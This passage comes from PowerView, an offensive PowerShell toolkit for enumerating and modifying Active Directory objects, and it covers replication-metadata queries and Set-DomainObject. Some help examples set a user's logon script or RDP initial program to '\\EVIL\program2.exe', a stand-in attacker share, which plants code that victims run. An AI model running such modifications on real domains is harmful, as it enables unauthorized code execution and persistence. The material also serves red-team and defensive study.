\"(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))\"\n                }\n                else {\n                    $UACValue = [Int]($UACEnum::$_)\n                    $Filter += \"(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)\"\n                }\n            }\n\n            if ($Filter -and $Filter -ne '') {\n                $ObjectSearcher.filter = \"(&$Filter)\"\n            }\n            Write-Verbose \"[Get-DomainObject] Get-DomainObject filter string: $($ObjectSearcher.filter)\"\n\n            if ($PSBoundParameters['FindOne']) { $Results = $ObjectSearcher.FindOne() }\n            else { $Results = $ObjectSearcher.FindAll() }\n            $Results | Where-Object {$_} | ForEach-Object {\n                if ($PSBoundParameters['Raw']) {\n                    # return raw result objects\n                    $Object = $_\n                    $Object.PSObject.TypeNames.Insert(0, 'PowerView.ADObject.Raw')\n                }\n                else {\n                    $Object = Convert-LDAPProperty -Properties $_.Properties\n                    $Object.PSObject.TypeNames.Insert(0, 'PowerView.ADObject')\n                }\n                $Object\n            }\n            if ($Results) {\n                try { $Results.dispose() }\n                catch {\n                    Write-Verbose \"[Get-DomainObject] Error disposing of the Results object: $_\"\n                }\n            }\n            $ObjectSearcher.dispose()\n        }\n    }\n}\n\n\nfunction Get-DomainObjectAttributeHistory {\n<#\n.SYNOPSIS\n\nReturns the Active Directory attribute replication metadata for the specified\nobject, i.e. a parsed version of the msds-replattributemetadata attribute.\nBy default, replication data for every domain object is returned.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: Get-DomainObject\n\n.DESCRIPTION\n\nWraps Get-DomainObject with a specification to retrieve the property 'msds-replattributemetadata'.\nThis is the domain attribute replication metadata associated with the object. The results are\nparsed from their XML string form and returned as a custom object.\n\n.PARAMETER Identity\n\nA SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),\nSID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).\nWildcards accepted.\n\n.PARAMETER Domain\n\nSpecifies the domain to use for the query, defaults to the current domain.\n\n.PARAMETER LDAPFilter\n\nSpecifies an LDAP query string that is used to filter Active Directory objects.\n\n.PARAMETER Properties\n\nOnly return replication metadata on the specified property names.\n\n.PARAMETER SearchBase\n\nThe LDAP source to search through, e.g. \"LDAP://OU=secret,DC=testlab,DC=local\"\nUseful for OU queries.\n\n.PARAMETER Server\n\nSpecifies an Active Directory server (domain controller) to bind to.\n\n.PARAMETER SearchScope\n\nSpecifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).\n\n.PARAMETER ResultPageSize\n\nSpecifies the PageSize to set for the LDAP searcher object.\n\n.PARAMETER ServerTimeLimit\n\nSpecifies the maximum amount of time the server spends searching. Default of 120 seconds.\n\n.PARAMETER Tombstone\n\nSwitch. Specifies that the searcher should also return deleted/tombstoned objects.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the target domain.\n\n.EXAMPLE\n\nGet-DomainObjectAttributeHistory -Domain testlab.local\n\nReturn all attribute replication metadata for all objects in the testlab.local domain.\n\n.EXAMPLE\n\n'S-1-5-21-883232822-274137685-4173207997-1109','CN=dfm.a,CN=Users,DC=testlab,DC=local','da','94299db1-e3e7-48f9-845b-3bffef8bedbb' | Get-DomainObjectAttributeHistory -Properties objectClass | ft\n\nObjectDN      ObjectGuid    AttributeNam LastOriginat Version      LastOriginat\n                            e            ingChange                 ingDsaDN\n--------      ----------    ------------ ------------ -------      ------------\nCN=dfm.a,C... a6263874-f... objectClass  2017-03-0... 1            CN=NTDS S...\nCN=DA,CN=U... 77b56df4-f... objectClass  2017-04-1... 1            CN=NTDS S...\nCN=harmj0y... 94299db1-e... objectClass  2017-03-0... 1            CN=NTDS S...\n\n.EXAMPLE\n\nGet-DomainObjectAttributeHistory harmj0y -Properties userAccountControl\n\nObjectDN              : CN=harmj0y,CN=Users,DC=testlab,DC=local\nObjectGuid            : 94299db1-e3e7-48f9-845b-3bffef8bedbb\nAttributeName         : userAccountControl\nLastOriginatingChange : 2017-03-07T19:56:27Z\nVersion               : 4\nLastOriginatingDsaDN  : CN=NTDS Settings,CN=PRIMARY,CN=Servers,CN=Default-First\n                        -Site-Name,CN=Sites,CN=Configuration,DC=testlab,DC=loca\n                        l\n\n.OUTPUTS\n\nPowerView.ADObjectAttributeHistory\n\nCustom PSObject with translated replication metadata fields.\n\n.LINK\n\nhttps://blogs.technet.microsoft.com/pie/2014/08/25/metadata-1-when-did-the-delegation-change-how-to-track-security-descriptor-modifications/\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]\n    [OutputType('PowerView.ADObjectAttributeHistory')]\n    [CmdletBinding()]\n    Param(\n        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]\n        [String[]]\n        $Identity,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $Domain,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('Filter')]\n        [String]\n        $LDAPFilter,\n\n        [ValidateNotNullOrEmpty()]\n        [String[]]\n        $Properties,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('ADSPath')]\n        [String]\n        $SearchBase,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('DomainController')]\n        [String]\n        $Server,\n\n        [ValidateSet('Base', 'OneLevel', 'Subtree')]\n        [String]\n        $SearchScope = 'Subtree',\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ResultPageSize = 200,\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ServerTimeLimit,\n\n        [Switch]\n        $Tombstone,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty,\n\n        [Switch]\n        $Raw\n    )\n\n    BEGIN {\n        $SearcherArguments = @{\n            'Properties'    =   'msds-replattributemetadata','distinguishedname'\n            'Raw'           =   $True\n        }\n        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }\n        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }\n        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }\n        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }\n        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }\n        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }\n        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }\n        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }\n        if ($PSBoundParameters['FindOne']) { $SearcherArguments['FindOne'] = $FindOne }\n        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }\n\n        if ($PSBoundParameters['Properties']) {\n            $PropertyFilter = $PSBoundParameters['Properties'] -Join '|'\n        }\n        else {\n            $PropertyFilter = ''\n        }\n    }\n\n    PROCESS {\n        if ($PSBoundParameters['Identity']) { $SearcherArguments['Identity'] = $Identity }\n\n        Get-DomainObject @SearcherArguments | ForEach-Object {\n            $ObjectDN = $_.Properties['distinguishedname'][0]\n            ForEach($XMLNode in $_.Properties['msds-replattributemetadata']) {\n                $TempObject = [xml]$XMLNode | Select-Object -ExpandProperty 'DS_REPL_ATTR_META_DATA' -ErrorAction SilentlyContinue\n                if ($TempObject) {\n                    if ($TempObject.pszAttributeName -Match $PropertyFilter) {\n                        $Output = New-Object PSObject\n                        $Output | Add-Member NoteProperty 'ObjectDN' $ObjectDN\n                        $Output | Add-Member NoteProperty 'AttributeName' $TempObject.pszAttributeName\n                        $Output | Add-Member NoteProperty 'LastOriginatingChange' $TempObject.ftimeLastOriginatingChange\n                        $Output | Add-Member NoteProperty 'Version' $TempObject.dwVersion\n                        $Output | Add-Member NoteProperty 'LastOriginatingDsaDN' $TempObject.pszLastOriginatingDsaDN\n                        $Output.PSObject.TypeNames.Insert(0, 'PowerView.ADObjectAttributeHistory')\n                        $Output\n                    }\n                }\n                else {\n                    Write-Verbose \"[Get-DomainObjectAttributeHistory] Error retrieving 'msds-replattributemetadata' for '$ObjectDN'\"\n                }\n            }\n        }\n    }\n}\n\n\nfunction Get-DomainObjectLinkedAttributeHistory {\n<#\n.SYNOPSIS\n\nReturns the Active Directory links attribute value replication metadata for the\nspecified object, i.e. a parsed version of the msds-replvaluemetadata attribute.\nBy default, replication data for every domain object is returned.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: Get-DomainObject\n\n.DESCRIPTION\n\nWraps Get-DomainObject with a specification to retrieve the property 'msds-replvaluemetadata'.\nThis is the domain linked attribute value replication metadata associated with the object. The\nresults are parsed from their XML string form and returned as a custom object.\n\n.PARAMETER Identity\n\nA SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),\nSID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).\nWildcards accepted.\n\n.PARAMETER Domain\n\nSpecifies the domain to use for the query, defaults to the current domain.\n\n.PARAMETER LDAPFilter\n\nSpecifies an LDAP query string that is used to filter Active Directory objects.\n\n.PARAMETER Properties\n\nOnly return replication metadata on the specified property names.\n\n.PARAMETER SearchBase\n\nThe LDAP source to search through, e.g. \"LDAP://OU=secret,DC=testlab,DC=local\"\nUseful for OU queries.\n\n.PARAMETER Server\n\nSpecifies an Active Directory server (domain controller) to bind to.\n\n.PARAMETER SearchScope\n\nSpecifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).\n\n.PARAMETER ResultPageSize\n\nSpecifies the PageSize to set for the LDAP searcher object.\n\n.PARAMETER ServerTimeLimit\n\nSpecifies the maximum amount of time the server spends searching. Default of 120 seconds.\n\n.PARAMETER Tombstone\n\nSwitch. Specifies that the searcher should also return deleted/tombstoned objects.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the target domain.\n\n.EXAMPLE\n\nGet-DomainObjectLinkedAttributeHistory | Group-Object ObjectDN | ft -a\n\nCount Name\n----- ----\n    4 CN=Administrators,CN=Builtin,DC=testlab,DC=local\n    4 CN=Users,CN=Builtin,DC=testlab,DC=local\n    2 CN=Guests,CN=Builtin,DC=testlab,DC=local\n    1 CN=IIS_IUSRS,CN=Builtin,DC=testlab,DC=local\n    1 CN=Schema Admins,CN=Users,DC=testlab,DC=local\n    1 CN=Enterprise Admins,CN=Users,DC=testlab,DC=local\n    4 CN=Domain Admins,CN=Users,DC=testlab,DC=local\n    1 CN=Group Policy Creator Owners,CN=Users,DC=testlab,DC=local\n    1 CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=testlab,DC=local\n    1 CN=Windows Authorization Access Group,CN=Builtin,DC=testlab,DC=local\n    8 CN=Denied RODC Password Replication Group,CN=Users,DC=testlab,DC=local\n    2 CN=PRIMARY,CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,...\n    1 CN=Domain System Volume,CN=DFSR-LocalSettings,CN=PRIMARY,OU=Domain Con...\n    1 CN=ServerAdmins,CN=Users,DC=testlab,DC=local\n    3 CN=DomainLocalGroup,CN=Users,DC=testlab,DC=local\n\n\n.EXAMPLE\n\n'S-1-5-21-883232822-274137685-4173207997-519','af94f49e-61a5-4f7d-a17c-d80fb16a5220' | Get-DomainObjectLinkedAttributeHistory\n\nObjectDN              : CN=Enterprise Admins,CN=Users,DC=testlab,DC=local\nObjectGuid            : 94e782c1-16a1-400b-a7d0-1126038c6387\nAttributeName         : member\nAttributeValue        : CN=Administrator,CN=Users,DC=testlab,DC=local\nTimeDeleted           : 2017-03-06T00:48:29Z\nTimeCreated           : 2017-03-06T00:48:29Z\nLastOriginatingChange : 2017-03-06T00:48:29Z\nVersion               : 1\nLastOriginatingDsaDN  : CN=NTDS Settings,CN=PRIMARY,CN=Servers,CN=Default-First\n                        -Site-Name,CN=Sites,CN=Configuration,DC=testlab,DC=loca\n                        l\n\nObjectDN              : CN=Domain Admins,CN=Users,DC=testlab,DC=local\nObjectGuid            : af94f49e-61a5-4f7d-a17c-d80fb16a5220\nAttributeName         : member\nAttributeValue        : CN=dfm,CN=Users,DC=testlab,DC=local\nTimeDeleted           : 2017-06-13T22:20:02Z\nTimeCreated           : 2017-06-13T22:20:02Z\nLastOriginatingChange : 2017-06-13T22:20:22Z\nVersion               : 2\nLastOriginatingDsaDN  : CN=NTDS Settings,CN=PRIMARY,CN=Servers,CN=Default-First\n                        -Site-Name,CN=Sites,CN=Configuration,DC=testlab,DC=loca\n                        l\n\nObjectDN              : CN=Domain Admins,CN=Users,DC=testlab,DC=local\nObjectGuid            : af94f49e-61a5-4f7d-a17c-d80fb16a5220\nAttributeName         : member\nAttributeValue        : CN=Administrator,CN=Users,DC=testlab,DC=local\nTimeDeleted           : 2017-03-06T00:48:29Z\nTimeCreated           : 2017-03-06T00:48:29Z\nLastOriginatingChange : 2017-03-06T00:48:29Z\nVersion               : 1\nLastOriginatingDsaDN  : CN=NTDS Settings,CN=PRIMARY,CN=Servers,CN=Default-First\n                        -Site-Name,CN=Sites,CN=Configuration,DC=testlab,DC=loca\n                        l\n\n.EXAMPLE\n\nGet-DomainObjectLinkedAttributeHistory ServerAdmins -Domain testlab.local\n\nObjectDN              : CN=ServerAdmins,CN=Users,DC=testlab,DC=local\nObjectGuid            : 603b46ad-555c-49b3-8745-c0718febefc2\nAttributeName         : member\nAttributeValue        : CN=jason.a,CN=Users,DC=dev,DC=testlab,DC=local\nTimeDeleted           : 2017-04-10T22:17:19Z\nTimeCreated           : 2017-04-10T22:17:19Z\nLastOriginatingChange : 2017-04-10T22:17:19Z\nVersion               : 1\nLastOriginatingDsaDN  : CN=NTDS Settings,CN=PRIMARY,CN=Servers,CN=Default-First\n                        -Site-Name,CN=Sites,CN=Configuration,DC=testlab,DC=loca\n                        l\n\n.OUTPUTS\n\nPowerView.ADObjectLinkedAttributeHistory\n\nCustom PSObject with translated replication metadata fields.\n\n.LINK\n\nhttps://blogs.technet.microsoft.com/pie/2014/08/25/metadata-2-the-ephemeral-admin-or-how-to-track-the-group-membership/\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]\n    [OutputType('PowerView.ADObjectLinkedAttributeHistory')]\n    [CmdletBinding()]\n    Param(\n        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]\n        [String[]]\n        $Identity,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $Domain,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('Filter')]\n        [String]\n        $LDAPFilter,\n\n        [ValidateNotNullOrEmpty()]\n        [String[]]\n        $Properties,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('ADSPath')]\n        [String]\n        $SearchBase,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('DomainController')]\n        [String]\n        $Server,\n\n        [ValidateSet('Base', 'OneLevel', 'Subtree')]\n        [String]\n        $SearchScope = 'Subtree',\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ResultPageSize = 200,\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ServerTimeLimit,\n\n        [Switch]\n        $Tombstone,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty,\n\n        [Switch]\n        $Raw\n    )\n\n    BEGIN {\n        $SearcherArguments = @{\n            'Properties'    =   'msds-replvaluemetadata','distinguishedname'\n            'Raw'           =   $True\n        }\n        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }\n        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }\n        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }\n        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }\n        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }\n        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }\n        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }\n        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }\n        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }\n\n        if ($PSBoundParameters['Properties']) {\n            $PropertyFilter = $PSBoundParameters['Properties'] -Join '|'\n        }\n        else {\n            $PropertyFilter = ''\n        }\n    }\n\n    PROCESS {\n        if ($PSBoundParameters['Identity']) { $SearcherArguments['Identity'] = $Identity }\n\n        Get-DomainObject @SearcherArguments | ForEach-Object {\n            $ObjectDN = $_.Properties['distinguishedname'][0]\n            ForEach($XMLNode in $_.Properties['msds-replvaluemetadata']) {\n                $TempObject = [xml]$XMLNode | Select-Object -ExpandProperty 'DS_REPL_VALUE_META_DATA' -ErrorAction SilentlyContinue\n                if ($TempObject) {\n                    if ($TempObject.pszAttributeName -Match $PropertyFilter) {\n                        $Output = New-Object PSObject\n                        $Output | Add-Member NoteProperty 'ObjectDN' $ObjectDN\n                        $Output | Add-Member NoteProperty 'AttributeName' $TempObject.pszAttributeName\n                        $Output | Add-Member NoteProperty 'AttributeValue' $TempObject.pszObjectDn\n                        $Output | Add-Member NoteProperty 'TimeCreated' $TempObject.ftimeCreated\n                        $Output | Add-Member NoteProperty 'TimeDeleted' $TempObject.ftimeDeleted\n                        $Output | Add-Member NoteProperty 'LastOriginatingChange' $TempObject.ftimeLastOriginatingChange\n                        $Output | Add-Member NoteProperty 'Version' $TempObject.dwVersion\n                        $Output | Add-Member NoteProperty 'LastOriginatingDsaDN' $TempObject.pszLastOriginatingDsaDN\n                        $Output.PSObject.TypeNames.Insert(0, 'PowerView.ADObjectLinkedAttributeHistory')\n                        $Output\n                    }\n                }\n                else {\n                    Write-Verbose \"[Get-DomainObjectLinkedAttributeHistory] Error retrieving 'msds-replvaluemetadata' for '$ObjectDN'\"\n                }\n            }\n        }\n    }\n}\n\n\nfunction Set-DomainObject {\n<#\n.SYNOPSIS\n\nModifies a gven property for a specified active directory object.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: Get-DomainObject  \n\n.DESCRIPTION\n\nSplats user/object targeting parameters to Get-DomainObject, returning the raw\nsearchresult object. Retrieves the raw directoryentry for the object, and sets\nany values from -Set @{}, XORs any values from -XOR @{}, and clears any values\nfrom -Clear @().\n\n.PARAMETER Identity\n\nA SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),\nSID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).\nWildcards accepted.\n\n.PARAMETER Set\n\nSpecifies values for one or more object properties (in the form of a hashtable) that will replace the current values.\n\n.PARAMETER XOR\n\nSpecifies values for one or more object properties (in the form of a hashtable) that will XOR the current values.\n\n.PARAMETER Clear\n\nSpecifies an array of object properties that will be cleared in the directory.\n\n.PARAMETER Domain\n\nSpecifies the domain to use for the query, defaults to the current domain.\n\n.PARAMETER LDAPFilter\n\nSpecifies an LDAP query string that is used to filter Active Directory objects.\n\n.PARAMETER SearchBase\n\nThe LDAP source to search through, e.g. \"LDAP://OU=secret,DC=testlab,DC=local\"\nUseful for OU queries.\n\n.PARAMETER Server\n\nSpecifies an Active Directory server (domain controller) to bind to.\n\n.PARAMETER SearchScope\n\nSpecifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).\n\n.PARAMETER ResultPageSize\n\nSpecifies the PageSize to set for the LDAP searcher object.\n\n.PARAMETER ServerTimeLimit\n\nSpecifies the maximum amount of time the server spends searching. Default of 120 seconds.\n\n.PARAMETER Tombstone\n\nSwitch. Specifies that the searcher should also return deleted/tombstoned objects.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the target domain.\n\n.EXAMPLE\n\nSet-DomainObject testuser -Set @{'mstsinitialprogram'='\\\\EVIL\\program.exe'} -Verbose\n\nVERBOSE: Get-DomainSearcher search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local\nVERBOSE: Get-DomainObject filter string: (&(|(samAccountName=testuser)))\nVERBOSE: Setting mstsinitialprogram to \\\\EVIL\\program.exe for object testuser\n\n.EXAMPLE\n\n\"S-1-5-21-890171859-3433809279-3366196753-1108\",\"testuser\" | Set-DomainObject -Set @{'countrycode'=1234; 'mstsinitialprogram'='\\\\EVIL\\program2.exe'} -Verbose\n\nVERBOSE: Get-DomainSearcher search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local\nVERBOSE: Get-DomainObject filter string:\n(&(|(objectsid=S-1-5-21-890171859-3433809279-3366196753-1108)))\nVERBOSE: Setting mstsinitialprogram to \\\\EVIL\\program2.exe for object harmj0y\nVERBOSE: Setting countrycode to 1234 for object harmj0y\nVERBOSE: Get-DomainSearcher search string:\nLDAP://PRIMARY.testlab.local/DC=testlab,DC=local\nVERBOSE: Get-DomainObject filter string: (&(|(samAccountName=testuser)))\nVERBOSE: Setting mstsinitialprogram to \\\\EVIL\\program2.exe for object testuser\nVERBOSE: Setting countrycode to 1234 for object testuser\n\n.EXAMPLE\n\n\"S-1-5-21-890171859-3433809279-3366196753-1108\",\"testuser\" | Set-DomainObject -Clear department -Verbose\n\nCleares the 'department' field for both object identities.\n\n.EXAMPLE\n\nGet-DomainUser testuser | ConvertFrom-UACValue -Verbose\n\nName                           Value\n----                           -----\nNORMAL_ACCOUNT                 512\n\n\nSet-DomainObject -Identity testuser -XOR @{useraccountcontrol=65536} -Verbose\n\nVERBOSE: Get-DomainSearcher search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local\nVERBOSE: Get-DomainObject filter string: (&(|(samAccountName=testuser)))\nVERBOSE: XORing 'useraccountcontrol' with '65536' for object 'testuser'\n\nGet-DomainUser testuser | ConvertFrom-UACValue -Verbose\n\nName                           Value\n----                           -----\nNORMAL_ACCOUNT                 512\nDONT_EXPIRE_PASSWORD           65536\n\n.EXAMPLE\n\nGet-DomainUser -Identity testuser -Properties scriptpath\n\nscriptpath\n----------\n\\\\primary\\sysvol\\blah.ps1\n\n$SecPassword = ConvertTo-SecureString 'Password123!'-AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\nSet-DomainObject -Identity testuser -Set @{'scriptpath'='\\\\EVIL\\program2.exe'} -Credential $Cred -Verbose\nVERBOSE: [Get-Domain] Using alternate credentials for Get-Domain\nVERBOSE: [Get-Domain] Extracted domain 'TESTLAB' from -Credential\nVERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local\nVERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection\nVERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(|(samAccountName=testuser)(name=testuser))))\nVERBOSE: [Set-DomainObject] Setting 'scriptpath' to '\\\\EVIL\\program2.exe' for object 'testuser'\n\nGet-DomainUser -Identity testuser -Properties scriptpath\n\nscriptpath\n----------\n\\\\EVIL\\program2.exe\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [CmdletBinding()]\n    Param(\n        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('DistinguishedName', 'SamAccountName', 'Name')]\n        [String[]]\n        $Identity,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('Replace')]\n        [Hashtable]\n        $Set,\n\n        [ValidateNotNullOrEmpty()]\n        [Hashtable]\n        $XOR,\n\n        [ValidateNotNullOrEmpty()]\n        [String[]]\n        $Clear,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $Domain,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('Filter')]\n        [String]\n        $LDAPFilter,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('ADSPath')]\n        [String]\n        $SearchBase,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('DomainController')]\n        [String]\n        $Server,\n\n        [ValidateSet('Base', 'OneLevel', 'Subtree')]\n        [String]\n        $SearchScope = 'Subtree',\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ResultPageSize = 200,\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ServerTimeLimit,\n\n        [Switch]\n        $Tombstone,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )\n\n    BEGIN {\n        $SearcherArguments = @{'Raw' = $True}\n        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }\n        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }\n        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }\n        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }\n        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }\n        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }\n        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }\n        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }\n        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }\n    }\n\n    PROCESS {\n        if ($PSBoundParameters['Identity']) { $SearcherArguments['Identity'] = $Identity }\n\n        # splat the appropriate arguments to Get-DomainObject\n        $RawObject = Get-DomainObject @SearcherArguments\n\n        ForEach ($Object in $RawObject) {\n\n            $Entry = $RawObject.GetDirectoryEntry()\n\n            if($PSBoundParameters['Set']) {\n                try {\n                    $PSBoundParameters['Set'].GetEnumerator() | ForEach-Object {\n                        Write-Verbose \"[Set-DomainObject] Setting '$($_.Name)' to '$($_.Value)' for object '$($RawObject.Properties.samaccountname)'\"\n                        $Entry.put($_.Name, $_.Value)\n                    }\n                    $Entry.commitchanges()\n                }\n                catch {\n                    Write-Warning \"[Set-DomainObject] Error setting/replacing properties for object '$($RawObject.Properties.samaccountname)' : $_\"\n                }\n            }\n            if($PSBoundParameters['XOR']) {\n                try {\n                    $PSBoundParameters['XOR'].GetEnumerator() | ForEach-Object {\n                        $PropertyName = $_.Name\n                        $PropertyXorValue = $_.Value\n                        Write-Verbose \"[Set-DomainObject] XORing '$PropertyName' with '$PropertyXorValue' for object '$($RawObject.Properties.samaccountname)'\"\n                        $TypeName = $Entry.$PropertyName[0].GetType().name\n\n                        # UAC value references- https://support.microsoft.com/en-us/kb/305144\n                        $PropertyValue = $($Entry.$PropertyName) -bxor $PropertyXorValue\n                        $Entry.$PropertyName = $PropertyValue -as $TypeName\n                    }\n                    $Entry.commitchanges()\n                }\n                catch {\n                    Write-Warning \"[Set-DomainObject] Error XOR'ing properties for object '$($RawObject.Properties.samaccountname)' : $_\"\n                }\n            }\n            if($PSBoundParameters['Clear']) {\n                try {\n                    $PSBoundParameters['Clear'] | ForEach-Object {\n                        $PropertyName = $_\n                        Write-Verbose \"[Set-DomainObject] Clearing '$PropertyName' for object '$($RawObject.Properties.samaccountname)'\"\n                        $Entry.$PropertyName.clear()\n                    }\n                    $Entry.commitchanges()\n                }\n                catch {\n                    Write-Warning \"[Set-DomainObject] Error clearing properties for object '$($RawObject.Properties.samaccountname)' : $_\"\n                }\n            }\n        }\n    }\n}\n\n\nfunction ConvertFrom-LDAPLogonHours {\n<#\n.SYNOPSIS\n\nConverts the LDAP LogonHours array to a processible object.\n\nAuthor: Lee Christensen (@tifkin_)  \nLicense: BSD 3-Clause  \nRequired Dependencies: None\n\n.DESCRIPTION\n\nConverts the LDAP LogonHours array to a processible object.  Each entry\nproperty in the output object corresponds to a day of the week and hour during\nthe day (in UTC) indicating whether or not the user can logon at the specified\nhour.\n\n.PARAMETER LogonHoursArray\n\n21-byte LDAP hours array.\n\n.EXAMPLE\n\n$hours = (Get-DomainUser -LDAPFilter 'userworkstations=*')[0].logonhours\nConvertFrom-LDAPLogonHours $hours\n\nGets the logonhours array from the first AD user with logon restrictions.\n\n.OUTPUTS\n\nPowerView.LogonHours\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [OutputType('PowerView.LogonHours')]\n    [CmdletBinding()]\n    Param (\n        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [ValidateNotNullOrEmpty()]\n        [byte[]]\n        $LogonHoursArray\n    )\n\n    Begin {\n        if($LogonHoursArray.Count -ne 21) {\n            throw \"LogonHoursArray is the incorrect length\"\n        }\n\n        function ConvertTo-LogonHoursArray {\n            Param (\n                [int[]]\n                $HoursArr\n            )\n\n            $LogonHours = New-Object 